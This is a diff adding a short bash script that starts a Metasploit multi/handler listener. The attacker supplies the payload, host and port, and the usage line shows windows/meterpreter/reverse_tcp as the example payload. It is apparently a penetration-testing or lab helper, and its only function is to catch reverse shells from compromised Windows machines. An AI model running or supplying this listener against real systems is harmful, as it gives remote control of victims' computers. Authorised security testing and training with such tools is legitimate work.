@@ -1,0 +1,10 @@
+#!/bin/bash
+
+if [ $# -ne 3 ]; then
+    echo "Enter arguments please :)"
+    echo "handler windows/meterpreter/reverse_tcp 10.11.0.77 445  "
+    exit 1
+fi
+
+msfconsole -x "use exploit/multi/handler;set PAYLOAD $1; set LHOST $2;set LPORT $3;set ExitOnSession false; run"
+
